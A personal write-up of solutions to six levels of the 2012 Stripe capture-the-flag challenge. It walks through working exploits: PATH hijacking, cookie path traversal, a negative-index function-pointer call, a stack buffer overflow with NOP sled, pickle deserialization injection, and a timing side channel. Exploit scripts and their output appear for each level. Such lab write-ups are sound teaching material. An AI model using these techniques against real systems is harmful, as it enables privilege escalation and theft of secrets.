Hi. I'm Florian 'dividuum' Wesch <fw@dividuum.de> and this is 
my successful Stripe.com CTF attempt.







   
    __        __               _               
    \ \      / /_ _ _ __ _ __ (_)_ __   __ _ _ 
     \ \ /\ / / _` | '__| '_ \| | '_ \ / _` (_)
      \ V  V / (_| | |  | | | | | | | | (_| |_ 
       \_/\_/ \__,_|_|  |_| |_|_|_| |_|\__, (_)
                                       |___/   
                       _        _              
        ___ ___  _ __ | |_ __ _(_)_ __  ___    
       / __/ _ \| '_ \| __/ _` | | '_ \/ __|   
      | (_| (_) | | | | || (_| | | | | \__ \   
       \___\___/|_| |_|\__\__,_|_|_| |_|___/   
                        _ _               
        ___ _ __   ___ (_) | ___ _ __ ___  
       / __| '_ \ / _ \| | |/ _ \ '__/ __|
       \__ \ |_) | (_) | | |  __/ |  \__ \
       |___/ .__/ \___/|_|_|\___|_|  |___/
           |_|                            
 



             .----- scroll down
             v 




































      Are you sure you want to see this?

      You'll ruin the fun you might have if you
      solve it yourself.

































Level1
======

Goal is to get the setuid program /levels/level01 to read the
file /home/level02/.password. Let's look at its sourcecode:

    level01@ctf5:/tmp/tmp.SH2ekcQrHv$ cat /levels/level01.c 
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(int argc, char **argv)
    {
      printf("Current time: ");
      fflush(stdout);
      system("date");
      return 0;
    }

As you can see, the program executes the program date to display
the current time. Since there is no path hardcoded it's simple
to execute your own date program.

    level01@ctf5:/tmp/tmp.SH2ekcQrHv$ echo "/bin/cat /home/level02/.password" > date
    level01@ctf5:/tmp/tmp.SH2ekcQrHv$ chmod 755 date
    level01@ctf5:/tmp/tmp.SH2ekcQrHv$ export PATH=$PWD
    level01@ctf5:/tmp/tmp.SH2ekcQrHv$ /levels/level01
    Current time: kxlVXUvzv


Level2
======

The goal is to get the php script located at http://ctf.stri.pe/level02.php to
read /home/level03/.password

    level02@ctf4:/tmp/tmp.BdxuQhJI7W$ cat /var/www/level02.php
    <?php
        [...]
        $out = '';
        if (!isset($_COOKIE['user_details'])) {
          [...]
          setcookie('user_details', $filename);
        }
        else {
          $out = file_get_contents('/tmp/level02/'.$_COOKIE['user_details']);
        }
    
    ?>
    <html>
      [...]
        <p><?php echo $out ?></p>
      [...]
    </html>

As you can see, the script will read user data from a file. The filename is
based on the provided cookie content. So let's build our own request and 
make the script read /home/level03/.password for us. This is the request.
The Authorization header was created by looking at the headers using the
chrome webinspector.

    GET /level02.php HTTP/1.1
    Host: ctf.stri.pe
    Authorization: [copied from webinspector headers]
    Cookie: user_details=../../home/level03/.password

Here is the result (Notice: I run this on my own machine since
access to ctf.stri.pe seems to be blocked from within the ctf 
machines): 

    dividuum@narf:/tmp$ nc ctf.stri.pe 80 < req
    HTTP/1.1 200 OK
    [...]
    Content-Type: text/html

    <html>
      <head>
        <title>Level02</title>
      </head>
      <body>
        <h1>Welcome to the challenge!</h1>
        <div class="main">
          <p>Or0m4UX07b
          [...]

The last line contains the password for level3.

Level3
======

Goal: Get /levels/level03 to read /home/level04/.password. level03 is a
setuid binary that seems to provide string modification services:

    level03@ctf4:/tmp/tmp.h4nG3wtMrD$ /levels/level03
    Usage: ./level03 INDEX STRING
    Possible indices:
    [0] to_upper    [1] to_lower
    [2] capitalize  [3] length
    level03@ctf4:/tmp/tmp.h4nG3wtMrD$ /levels/level03 0 foobar
    Uppercased string: FOOBAR

Let's look at the sourcecode:

    level03@ctf4:/tmp/tmp.h4nG3wtMrD$ cat /levels/level03.c
    [...]
    int length(const char *str)
    {
      int len = 0;
      for (len; str[len]; len++) {}
    
      printf("Length of string '%s': %d\n", str, len);
      return 0;
    }
    
    int run(const char *str)
    {
      // This function is now deprecated.
      return system(str);
    }
    
    int truncate_and_call(fn_ptr *fns, int index, char *user_string)
    {
      char buf[64];
      // Truncate supplied string
      strncpy(buf, user_string, sizeof(buf) - 1);
      buf[sizeof(buf) - 1] = '\0';
      return fns[index](buf);
    }
    
    int main(int argc, char **argv)
    {
      int index;
      fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

      [...]
    
      // Parse supplied index
      index = atoi(argv[1]);
    
      if (index >= NUM_FNS) {
        [...]
        exit(-1);
      }
    
      return truncate_and_call(fns, index, argv[2]);
    }

Notice how you can provide negative values to argv[1]. By doing so, you
can make truncate_and_call call into any function with the fn_ptr signature.
Lukily there is a very usefull function inside: run.

The stack layout before the fns[index](buf) call is like this:

    ^ top of the stack (lower addresses)
    buf[64]
    return address of truncate and call
    fns[4]
    index
    return address of main

You'll notice that if you index fns with a negative value, at some offset the
resulting pointer will point inside of buf. The goal is therefore to find the
negative index and the address of the run function.

    level03@ctf4:/tmp/tmp.h4nG3wtMrD$ objdump -d /levels/level03|grep run
    0804875b <run>:
    [...]

The run function is at 0x0804875b. The negative index can be brute forced. This
will only require a few tries since it's unlikely that fns and buf a far from each
other. Here's the exploit code:

    level03@ctf4:/tmp/tmp.h4nG3wtMrD$ cat ex.py 
    import struct, subprocess
    run = 0x0804875b
    blob = struct.pack("<i", run)
    arg2 = "%-31s#%s" % ("cat /home/level04/.password", blob*20)
    subprocess.call(["/levels/level03", "-15", arg2])

    level03@ctf4:/tmp/tmp.h4nG3wtMrD$ python ex.py 
    i5cBbPvPCpcP

Level4
======

Same procedure: Get setuid /levels/level04 to read /home/level05/.password.

Level4 sourcecode:

    level04@ctf4:/tmp/tmp.tNG0OD1m37$ cat /levels/level04.c
    [...]
    void fun(char *str)
    {
      char buf[1024];
      strcpy(buf, str);
    }

    int main(int argc, char **argv)
    {
      if (argc != 2) {
        printf("Usage: ./level04 STRING");
        exit(-1);
      }
      fun(argv[1]);
      printf("Oh no! That didn't work!\n");
      return 0;
    }

Notice the usage of strcpy on a size limited buffer. strcpy will happily
write more than 1024 bytes from str into buf. Since buf is located on the
stack (as it is a local variable) writing more than 1024 bytes can be used
to modify the return address of fun. Let's look at the stack as it looks
inside of fun:

    ^ top of the stack (lower addresses)
    buf[1024]
    return address of truncate and call

We can now execute our own code, if we overwrite the return address (the 
address the program will jump to, if the function call fun is completed).

The input for the fun function (and therefore the level04 program) will 
be like this:

    &buf
    |         <1024 bytes>             |     <overflow bytes>            |
    |<nop><nop><nop>...<nop><shellcode>|<&buf><&buf><&buf><&buf>...<&buf>|

So we overwrite the return address with the location of buf. This
will make the program jump into the buf. It will then execute a bunch of
NOPs and finally execute our shellcode.

The problem is: We don't know the address of buf, since the system uses
stack randomization (the stack starts at a random address). Our solution:
Repeatedly run the program with an assumed address. It will crash it
the stack doesn't match our assumption. At some point, we will have 
guessed correct and the shellcode will execute. Notice, that the NOPs
will increase our rate of success: &buf can point to any of the NOPs.

    level04@ctf4:/tmp/tmp.tNG0OD1m37$ cat ex.py 
    import struct, subprocess
    shellcode = "[/bin/sh executing shellcode]"
    stack = 0xffb48e8c
    stack_ptr = struct.pack("<I", stack)*500
    exploit = "\x90" * (1024-len(shellcode)) + shellcode
    arg = "%s%s" % (exploit, stack_ptr)
    while True:
      subprocess.call(["/levels/level04", arg])

    level04@ctf4:/tmp/tmp.tNG0OD1m37$ python ex.py 
    [.. waiting ...]
    $ id
    uid=1004(level04) gid=1005(level04) euid=1005(level05) groups=1001(chroot),1005(level04)
    $ cat /home/level05/.password 
    fzfDGnSmd317

Level5
======

Level 5 is somewhat different. You'll have to exploit a provided webservice.
The webservice is written in Python and split into a http and a worker part.
A request is handled like this.

    <you> ----[http]----> [http] -----[pickled file]-----> [worker]

A request is sent like this:

    level05@ctf6:/tmp/tmp.TbFWEyG71v$ curl localhost:9020 -d 'hello friend'
    {
        "processing_time": 5.0067901611328125e-06, 
        "queue_time": 0.83625602722167969, 
        "result": "HELLO FRIEND"
    }
     
Let's look at the sourcecode:

    level05@ctf6:/tmp/tmp.TbFWEyG71v$ cat /levels/level05
    [...]
    class QueueUtils(object):
        @staticmethod
        def deserialize(serialized):
            logger.debug('Deserializing: %r' % serialized)
            parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
            match = parser.match(serialized)
            direction = match.group(1)
            data = match.group(2)
            job = pickle.loads(match.group(3))
            return direction, data, job

        @staticmethod
        def serialize(direction, data, job):
            serialized = """type: %s; data: %s; job: %s""" % (direction, data, pickle.dumps(job))
            logger.debug('Serialized to: %r' % serialized)
            return serialized
    [...]

serialized is used by the http part to serialize the request into a 
file. The worker will pick up new files and deserialzes them.

The posted value ("hello friend" in the example above) ends
up as data in the serialize function. job is an object containing
job information.

Notice that you can confuse the deserialize regex. If the string
we send contains "; job: <pickled>", the regex will allow us
to provide our own pickled data.

This might not look very useful, but pickle is not a safe serialization
format. You can create pickled data that will execute os.system with
a given string.

    dividuum@narf:~/stripe$ cat example.py 
    import pickle
    pickle.loads("cos\nsystem\n(S'date'\ntR.")

    dividuum@narf:~/stripe$ python example.py 
    Fri Feb 24 12:45:52 CET 2012

All we have to do now is send a prepared string to the http service,
let it serialize our string to a file. The worker will then pick up
this file and execute code we provide:

    level05@ctf6:/tmp/tmp.TbFWEyG71v$ cat ex.py 
    import pickle, os
    os.execve("/usr/bin/curl", [
      "", "localhost:9020", "-d", 
      "hello friend; job: cos\nsystem\n(S'cat /home/level06/.password > /tmp/the-password'\ntR."
    ], {})

    level05@ctf6:/tmp/tmp.TbFWEyG71v$ python ex.py 
    {
        "result": "Job timed out"
    }

    level05@ctf6:/tmp/tmp.TbFWEyG71v$ cat /tmp/the-password
    SF2w8qU1QDj

Level6
======

Level 6 is my favourite level. You'll have to use a complete different 
approach to solve it. Again: There is a setuid /levels/level06 which
must be somehow used to get the content of /home/the-flag/.password

You provide level06 with a file and a guessed password. I'll taunt
you if you guessed wrong:

    level06@ctf5:/tmp/tmp.q55uR6zRsw$ /levels/level06 /home/the-flag/.password foobar
    Welcome to the password checker!
    ......
    level06@ctf5:/tmp/tmp.q55uR6zRsw$ Ha ha, your password is incorrect!
    level06@ctf5:/tmp/tmp.q55uR6zRsw$

One (invalid) way to get the content of /home/the-flag/.password is
to try every possible password. This clearly wont work. So we need another 
way. Here is the code for level06:

    level06@ctf5:/tmp/tmp.q55uR6zRsw$ cat /levels/level06.c
    [...]
    char char_at(char *str, int pos) {
        return pos < strlen(str) ? str[pos] : 0;
    }

    void taunt() {
        if (!fork()) {
            execl("/bin/echo", "/bin/echo", "Ha ha, your password is incorrect!", NULL);
            exit(1);
        }
    }

    int main(int argc, char **argv) {
        char *correct, *guess, *file, guess_char, true_char;
        int known_incorrect = 0, i;
        FILE *f;

        if (argc != 3) {
                fprintf(stderr, "Usage: %s file guess\n\nCompares the contents of a file with a guess, and\nmakes fun of you if you didn't get it right.\n", argv[0]);
                exit(1);
        }

        file = argv[1];
        guess = argv[2];

        if (!(correct = malloc(1024))) {
                fprintf(stderr, "Error allocating buffer\n");
                exit(1);
        }

        if (!(f = fopen(file, "r"))) {
                fprintf(stderr, "Error opening file: %s\n", file);
                exit(1);
        }

        if (!fgets(correct, 1024, f)) {
                fprintf(stderr, "Error reading file: %s\n", file);
                exit(1);
        }

        if (correct[strlen(correct)-1] == '\n')
                correct[strlen(correct)-1] = '\0';

        fprintf(stderr, "Welcome to the password checker!\n");

        for (i = 0; i < strlen(guess); i++) {
                guess_char = char_at(guess, i);
                true_char = char_at(correct, i);
                fprintf(stderr, ".");
                if (!known_incorrect && (guess_char != true_char)) {
                        known_incorrect = 1;
                        taunt();
                }
        }

        if (!known_incorrect && strlen(guess) != strlen(correct)) {
                known_incorrect = 1;
                taunt();
        }

        fprintf(stderr, "\n");

        if (!known_incorrect) {
                fprintf(stderr, "Wait, how did you know that the password was %s?\n", correct);
        }

        return 0;
    }

The program first reads the content of the specified file. I first thought
there might be a heap corruption in there, but it looks like the program
is safe. We have to extract the password in another way.

Let's look at the for loop comparing our guess with the correct value.
A loop is executed for every character we provide. If we guessed wrong
it will taunt us. Notice that a dot is printed after each character 
comparision. If the loop is executed very slowly, you might be able
to count the number of dots before the program taunts you. Fortunately
there is a way to slow down the program: There a two strlen functions executed
for every character check: the strlen used in the for condition and the
strlen in the char_at function. Combined this means that the complexity of
each loop is O(n^2) with regard to the guess size. We just have to provide a
very large guess to slow the program down! The maximum size of the guess 
argument is MAX_ARG_STRLEN (around 130000 bytes).

Since the taunting happens in a forked child process there is a race 
between the printing of the dot and the output from the echo child.

I solved this by repeatedly giving the program a guess and checking if
there was one run where the number of dots equals the guess size. If
that's the case, we know that the guess cannot be correct, since the
program was able to taunt us so early. The first guesses will try 
to extract the first password character. So we feed the program all
alphanumerical characters and repeat our elimination process until
only one character remains: The first character of the password.
We then repeat this process using the first character combined with
all possible seconds characters.

By doing so, we slowly extract the correct password.

    level06@ctf5:/tmp/tmp.q55uR6zRsw$ cat ex.py 
    import os, pickle
    num_forks = 0
    def test(guess):
        global num_forks
        r, w = os.pipe()
        while 1:
            try:
                child = os.fork()
                num_forks = num_forks + 1
                if child == 0: # in child
                    os.dup2(w, 1)
                    os.dup2(w, 2)
                    os.close(r)
                    os.execve("/levels/level06", ["fo", "/home/the-flag/.password", guess], {})
                    os._exit(1)
                break
            except OSError:
                print "cannot fork. waiting. forks: ", num_forks
                os._exit(0)
        os.close(w)
        inp = os.fdopen(r, "r", 0)
        data = inp.read(100)
        os.kill(child, 9)
        return data

    OUTPUT_PREFIX = "Welcome to the password checker!\n"
    CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    big = "-" * (2**17 - 300) # ~ MAX_ARG_STRLEN

    def write_state(openset):
        out = file("state", "wb")
        pickle.dump(openset, out)
        out.close()

    def read_state():
        try:
            inp = file("state", "rb")
        except:
            print "no state. restrting"
            return set(CHARS)
        return pickle.load(inp)

    def bruteforce():
        openset = read_state()
        print "openset", openset
        while len(openset) > 1:
            print len(openset), "prefixes remaining"
            for prefix in list(openset):
                guess = prefix + big
                for i in xrange(10):
                    result = test(guess)[len(OUTPUT_PREFIX):]
                    try:
                        found_dots = result.index('H')
                        extra_skip = found_dots - len(prefix)
                        print prefix, repr(result), '->', extra_skip
                        if extra_skip == 0:
                            print "not a possible prefix"
                            # found early Haha. tested password 
                            # cannot be correct, since taunt was
                            # called so early
                            openset.remove(prefix)
                            write_state(openset)
                            break
                    except ValueError:
                        # no Haha in output
                        pass
        correct_prefix = openset.pop()
        openset = set(correct_prefix + char for char in CHARS)
        print "created new openset"
        write_state(openset)
    bruteforce()

    level06@ctf5:/tmp/tmp.q55uR6zRsw$ while true; do nice -n 20 python ex.py; sleep 1;done
    [...]
    openset set(['1', '0', '3', '2', '5', '7', '6', '9', '8', 'A', [...]
    58 prefixes remaining
    [...]
    7 '..........Ha ha, your password is incorrect!\n......................' -> 9
    7 '............................................Ha ha, your password is' -> 43
    7 '....................................................Ha ha, your pas' -> 51
    7 '.Ha ha, your password is incorrect!\n...............................' -> 0
    not a possible prefix
    [...]
    theflagl0eFTtT5oi0nOTxO5 [...]

Since this exploit is based on the delay between detecting a wrong guess 
(and printing a dot) and the output of the forked echo child, it might take
a while to finish. It might also be impossible to make any progress if the
machine is too loaded. 

Notice the "theflag" prefix of the correct password. It's nice of stripe to
give you a clue that the program is doing the right thing :-)

The Flag
========
       __
      (__)
       ||______________________________
       ||                              |
       ||      _        _              |
       ||  ___| |_ _ __(_)_ __   ___   |
       || / __| __| '__| | '_ \ / _ \  |
       || \__ \ |_| |  | | |_) |  __/  |
       || |___/\__|_|  |_| .__/ \___|  |
       ||                |_|           |
       ||                              |
       ||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       ||
       ||
       ||
       ||


    Please enter your preferred handle: dividuum
    Welcome, dividuum!
    the-flag@ctf4:/tmp/tmp.kW5XKxOH20$ 
